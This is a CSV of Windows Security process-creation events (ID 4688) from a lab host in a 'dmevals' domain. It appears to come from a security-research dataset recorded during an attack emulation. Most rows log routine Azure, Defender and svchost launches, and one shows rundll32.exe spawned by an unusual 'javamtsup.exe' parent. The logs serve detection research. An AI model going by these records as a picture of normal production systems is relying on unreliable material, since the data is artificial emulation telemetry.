timestamp,Category,Channel,CommandLine,EventID,EventReceivedTime,EventTime,EventType,ExecutionProcessID,Hostname,Keywords,MandatoryLabel,Message,NewProcessId,NewProcessName,Opcode,OpcodeValue,ParentProcessName,ProcessId,ProviderGuid,RecordNumber,Severity,SeverityValue,SourceModuleName,SourceModuleType,SourceName,SubjectDomainName,SubjectLogonId,SubjectUserName,SubjectUserSid,TargetDomainName,TargetLogonId,TargetUserName,TargetUserSid,Task,ThreadID,TokenElevationType,Version,host,port,tags
2020-05-02T03:19:35.471Z,Process Creation,security,"""C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe""",4688,2020-05-01 23:19:35,2020-05-01 23:19:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xda8
	New Process Name:	C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	""C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",DA8,C:\WindowsAzure\Packages\Telemetry\WindowsAzureTelemetryService.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},84261,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,376,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:35.471Z,Process Creation,security,"""C:\Program Files\Windows Defender\MsMpEng.exe""",4688,2020-05-01 23:19:35,2020-05-01 23:19:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xdb4
	New Process Name:	C:\Program Files\Windows Defender\MsMpEng.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	""C:\Program Files\Windows Defender\MsMpEng.exe""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",DB4,C:\Program Files\Windows Defender\MsMpEng.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},84262,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,376,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:35.484Z,Process Creation,security,C:\windows\system32\svchost.exe -k netsvcs -p -s WpnService,4688,2020-05-01 23:19:35,2020-05-01 23:19:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xdc8
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\system32\svchost.exe -k netsvcs -p -s WpnService

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",DC8,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},84285,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,376,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:35.496Z,Process Creation,security,rundll32.exe,4688,2020-05-01 23:19:35,2020-05-01 23:19:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe00
	New Process Name:	C:\Windows\System32\rundll32.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xce0
	Creator Process Name:	C:\Windows\System32\javamtsup.exe
	Process Command Line:	rundll32.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",E00,C:\Windows\System32\rundll32.exe,Info,0,C:\Windows\System32\javamtsup.exe,CE0,{54849625-5478-4994-A5BA-3E3B0328C30D},84307,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,456,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:35.534Z,Process Creation,security,C:\windows\System32\svchost.exe -k LocalService -p -s WdiServiceHost,4688,2020-05-01 23:19:35,2020-05-01 23:19:14,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-5-19
	Account Name:		LOCAL SERVICE
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E5

Process Information:
	New Process ID:		0xe9c
	New Process Name:	C:\Windows\System32\svchost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x2e0
	Creator Process Name:	C:\Windows\System32\services.exe
	Process Command Line:	C:\windows\System32\svchost.exe -k LocalService -p -s WdiServiceHost

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",E9C,C:\Windows\System32\svchost.exe,Info,0,C:\Windows\System32\services.exe,2E0,{54849625-5478-4994-A5BA-3E3B0328C30D},84380,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,NT AUTHORITY,3E5,LOCAL SERVICE,S-1-5-19,13312,96,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:35.582Z,Process Creation,security,"""wevtutil.exe"" um C:\WindowsAzure\Packages\GuestAgent\AzureEvents.man",4688,2020-05-01 23:19:35,2020-05-01 23:19:15,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf8c
	New Process Name:	C:\Windows\System32\wevtutil.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xd20
	Creator Process Name:	C:\WindowsAzure\Packages\WaAppAgent.exe
	Process Command Line:	""wevtutil.exe"" um C:\WindowsAzure\Packages\GuestAgent\AzureEvents.man

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",F8C,C:\Windows\System32\wevtutil.exe,Info,0,C:\WindowsAzure\Packages\WaAppAgent.exe,D20,{54849625-5478-4994-A5BA-3E3B0328C30D},84462,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,456,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:36.611Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:19:36,2020-05-01 23:19:15,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x9d0
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xf8c
	Creator Process Name:	C:\Windows\System32\wevtutil.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",9D0,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\wevtutil.exe,F8C,{54849625-5478-4994-A5BA-3E3B0328C30D},84546,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,32,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:53.181Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:19:47,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xd58
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xa18
	Creator Process Name:	C:\Windows\System32\dsregcmd.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",D58,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\dsregcmd.exe,A18,{54849625-5478-4994-A5BA-3E3B0328C30D},87891,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,380,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:53.186Z,Process Creation,security,"C:\windows\system32\netsh.exe trace start capture=yes traceFile=""C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl""",4688,2020-05-01 23:19:51,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xe14
	New Process Name:	C:\Windows\System32\netsh.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xc6c
	Creator Process Name:	C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe
	Process Command Line:	C:\windows\system32\netsh.exe trace start capture=yes traceFile=""C:\windows\TEMP\E7116ECA-DFE6-43C7-8FA8-8D3AC5AA8726\B91E06C5-1C7C-4830-9A76-74FA211560A7.etl""

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",E14,C:\Windows\System32\netsh.exe,Info,0,C:\Packages\Plugins\Microsoft.Azure.NetworkWatcher.NetworkWatcherAgentWindows\1.4.1421.1\NetworkWatcherAgent\NetworkWatcherAgent.exe,C6C,{54849625-5478-4994-A5BA-3E3B0328C30D},88015,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,380,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:19:53.186Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:19:51,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xf24
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xe14
	Creator Process Name:	C:\Windows\System32\netsh.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",F24,C:\Windows\System32\conhost.exe,Info,0,C:\Windows\System32\netsh.exe,E14,{54849625-5478-4994-A5BA-3E3B0328C30D},88016,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,384,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:20:00.670Z,Process Creation,security, -log C:\WindowsAzure\Logs\,4688,2020-05-01 23:19:51,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1028
	New Process Name:	C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPlugin\Code\VFPlugin.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0xd98
	Creator Process Name:	C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzureNetAgent.exe
	Process Command Line:	 -log C:\WindowsAzure\Logs\

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1028,C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPlugin\Code\VFPlugin.exe,Info,0,C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\WindowsAzureNetAgent.exe,D98,{54849625-5478-4994-A5BA-3E3B0328C30D},88100,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,188,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:20:00.670Z,Process Creation,security,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,4688,2020-05-01 23:19:51,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1044
	New Process Name:	C:\Windows\System32\conhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x1028
	Creator Process Name:	C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPlugin\Code\VFPlugin.exe
	Process Command Line:	\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1044,C:\Windows\System32\conhost.exe,Info,0,C:\WindowsAzure\WindowsAzureNetAgent_1.0.0.143\WindowsAzureNetAgent\Plugins\VFPlugin\Code\VFPlugin.exe,1028,{54849625-5478-4994-A5BA-3E3B0328C30D},88117,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,188,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:20:00.671Z,Process Creation,security,C:\windows\system32\wbem\unsecapp.exe -Embedding,4688,2020-05-01 23:19:51,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1054
	New Process Name:	C:\Windows\System32\wbem\unsecapp.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x3b0
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\windows\system32\wbem\unsecapp.exe -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1054,C:\Windows\System32\wbem\unsecapp.exe,Info,0,C:\Windows\System32\svchost.exe,3B0,{54849625-5478-4994-A5BA-3E3B0328C30D},88136,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,-,0,-,S-1-0-0,13312,188,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
2020-05-02T03:20:00.672Z,Process Creation,security,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,4688,2020-05-01 23:19:52,2020-05-01 23:19:17,AUDIT_SUCCESS,4,SCRANTON.dmevals.local,-9214364837600034816,S-1-16-16384,"A new process has been created.

Creator Subject:
	Security ID:		S-1-5-18
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E7

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		SCRANTON$
	Account Domain:		DMEVALS
	Logon ID:		0x3E4

Process Information:
	New Process ID:		0x1098
	New Process Name:	C:\Windows\System32\wbem\WmiPrvSE.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		S-1-16-16384
	Creator Process ID:	0x3b0
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.",1098,C:\Windows\System32\wbem\WmiPrvSE.exe,Info,0,C:\Windows\System32\svchost.exe,3B0,{54849625-5478-4994-A5BA-3E3B0328C30D},88167,INFO,2,eventlog,im_msvistalog,Microsoft-Windows-Security-Auditing,DMEVALS,3E7,SCRANTON$,S-1-5-18,DMEVALS,3E4,SCRANTON$,S-1-0-0,13312,188,%%1936,2,wec.internal.cloudapp.net,60737,['mordorDataset']
